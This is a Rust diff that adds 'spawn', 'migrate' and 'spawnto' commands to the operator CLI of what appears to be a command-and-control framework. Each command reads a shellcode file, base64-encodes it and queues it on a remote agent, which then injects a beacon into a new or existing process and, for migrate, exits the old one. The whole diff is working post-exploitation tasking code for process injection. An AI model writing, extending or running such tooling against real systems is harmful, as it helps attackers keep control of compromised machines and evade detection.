@@ -84,6 +84,130 @@ pub fn cmd_shinject(ctx: &CliCtx, agent: &str, pid: u32, remote_path: &str) -> R
     Ok(())
 }
 
+/// spawn <agent> <shellcode_path> — spawn a new beacon in the spawnto process.
+pub fn cmd_spawn(
+    ctx: &CliCtx,
+    agent: &str,
+    shellcode_path: &str,
+    spawn_exe: Option<&str>,
+) -> Result<()> {
+    let agent_id = resolve_agent_identifier(ctx.cli, ctx.base, agent)?;
+
+    let shellcode = std::fs::read(shellcode_path)
+        .map_err(|e| anyhow!("cannot read shellcode file '{}': {}", shellcode_path, e))?;
+    if shellcode.is_empty() {
+        return Err(anyhow!("shellcode file '{}' is empty", shellcode_path));
+    }
+
+    let shellcode_b64 = B64.encode(&shellcode);
+
+    let task_payload = serde_json::to_string(&serde_json::json!({
+        "shellcode_b64": shellcode_b64,
+        "spawn_exe": spawn_exe,
+    }))?;
+
+    let res = ctx
+        .cli
+        .post(format!("{}/v1/command/{}", ctx.base, agent_id))
+        .json(&serde_json::json!({
+            "command": task_payload,
+            "task_type": "spawn",
+        }))
+        .send()?;
+
+    if !res.status().is_success() {
+        return Err(anyhow!(
+            "spawn failed: status={} body={}",
+            res.status(),
+            res.text()?
+        ));
+    }
+
+    let exe_display = spawn_exe.unwrap_or("(agent default)");
+    display::print_success(&format!(
+        "spawn queued: {} bytes via '{}' on agent {}",
+        shellcode.len(),
+        exe_display,
+        agent_id
+    ));
+    Ok(())
+}
+
+/// migrate <agent> <pid> <shellcode_path> — inject beacon + exit current process.
+pub fn cmd_migrate(ctx: &CliCtx, agent: &str, pid: u32, shellcode_path: &str) -> Result<()> {
+    let agent_id = resolve_agent_identifier(ctx.cli, ctx.base, agent)?;
+
+    let shellcode = std::fs::read(shellcode_path)
+        .map_err(|e| anyhow!("cannot read shellcode file '{}': {}", shellcode_path, e))?;
+    if shellcode.is_empty() {
+        return Err(anyhow!("shellcode file '{}' is empty", shellcode_path));
+    }
+
+    let shellcode_b64 = B64.encode(&shellcode);
+
+    let task_payload = serde_json::to_string(&serde_json::json!({
+        "pid": pid,
+        "shellcode_b64": shellcode_b64,
+    }))?;
+
+    let res = ctx
+        .cli
+        .post(format!("{}/v1/command/{}", ctx.base, agent_id))
+        .json(&serde_json::json!({
+            "command": task_payload,
+            "task_type": "migrate",
+        }))
+        .send()?;
+
+    if !res.status().is_success() {
+        return Err(anyhow!(
+            "migrate failed: status={} body={}",
+            res.status(),
+            res.text()?
+        ));
+    }
+
+    display::print_success(&format!(
+        "migrate queued: {} bytes → PID {} on agent {} (agent will exit after injection)",
+        shellcode.len(),
+        pid,
+        agent_id
+    ));
+    Ok(())
+}
+
+/// spawnto <agent> <path> — set default spawnto process on agent.
+pub fn cmd_spawnto(ctx: &CliCtx, agent: &str, path: &str) -> Result<()> {
+    let agent_id = resolve_agent_identifier(ctx.cli, ctx.base, agent)?;
+
+    let task_payload = serde_json::to_string(&serde_json::json!({
+        "path": path,
+    }))?;
+
+    let res = ctx
+        .cli
+        .post(format!("{}/v1/command/{}", ctx.base, agent_id))
+        .json(&serde_json::json!({
+            "command": task_payload,
+            "task_type": "set_spawn_to",
+        }))
+        .send()?;
+
+    if !res.status().is_success() {
+        return Err(anyhow!(
+            "spawnto failed: status={} body={}",
+            res.status(),
+            res.text()?
+        ));
+    }
+
+    display::print_success(&format!(
+        "spawnto queued: '{}' on agent {}",
+        path, agent_id
+    ));
+    Ok(())
+}
+
 /// spawn-inject <agent> <shellcode_path> [--spawn-exe <exe>] — spawn suspended + inject.
 pub fn cmd_spawn_inject(
     ctx: &CliCtx,
